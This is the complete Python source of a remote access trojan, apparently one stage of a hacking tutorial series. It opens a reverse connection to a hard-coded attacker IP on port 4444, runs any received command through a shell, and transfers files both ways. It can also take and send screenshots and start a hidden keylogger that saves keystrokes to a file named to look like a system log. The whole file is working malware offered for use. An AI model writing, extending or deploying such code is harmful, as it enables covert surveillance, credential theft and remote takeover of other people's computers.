import socket
import os
import subprocess
import pyautogui
import time
import threading # <--- For background tasks
from pynput import keyboard # <--- The Keylogger Library

# --- CONFIGURATION ---
ATTACKER_IP = "192.168.1.15"  # <--- Your IP
PORT = 4444
LOG_FILE = "system_log.txt"   # The hidden file where keys live

# --- KEYLOGGER ENGINE ---
def on_press(key):
    try:
        # Try to get the character (a, b, c, 1, 2...)
        log_entry = str(key.char)
    except AttributeError:
        # Handle special keys (Space, Enter, Backspace)
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n"
        elif key == keyboard.Key.backspace:
            log_entry = "[BS]"
        else:
            log_entry = f"[{str(key).replace('Key.', '')}]"

    # Append to the file instantly
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def start_logging():
    # This starts the listener in the background
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- FILE TRANSFER FUNCTIONS (From Level 2/3) ---
def send_file(sock, filename):
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        sock.send(f"EXISTS {filesize}".encode())
        sock.recv(1024) 
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk: break
                sock.send(chunk)
    else:
        sock.send("ERROR: File not found".encode())

def receive_file(sock, command):
    _, filename, filesize = command.split()
    filesize = int(filesize)
    sock.send("OK".encode())
    with open(filename, "wb") as f:
        total_recv = 0
        while total_recv < filesize:
            data = sock.recv(4096)
            if not data: break
            f.write(data)
            total_recv += len(data)
    sock.send("[+] Upload Successful".encode())

# --- MAIN CONNECTION ---
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((ATTACKER_IP, PORT))
            break
        except:
            time.sleep(5)

    while True:
        try:
            command = s.recv(1024).decode()
            if command.lower() == 'exit': break
            
            # --- NEW: KEYLOGGER TOGGLE ---
            if command == "start_keylogger":
                t = threading.Thread(target=start_logging)
                t.daemon = True # Dies when main program dies
                t.start()
                s.send("[+] Keylogger started in background.".encode())

            # --- SPYWARE ---
            elif command == "screenshot":
                try:
                    pyautogui.screenshot().save("screen.png")
                    send_file(s, "screen.png")
                    os.remove("screen.png")
                except Exception as e:
                    s.send(str(e).encode())

            # --- FILE TRANSFER ---
            elif command.startswith("download"):
                send_file(s, command.split()[1])
            elif command.startswith("UPLOAD"):
                receive_file(s, command)
                
            # --- SHELL ---
            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    s.send(f"[+] Changed to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(str(e).encode())
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"[+] Done")
        except:
            break
    s.close()

if __name__ == "__main__":
    connect()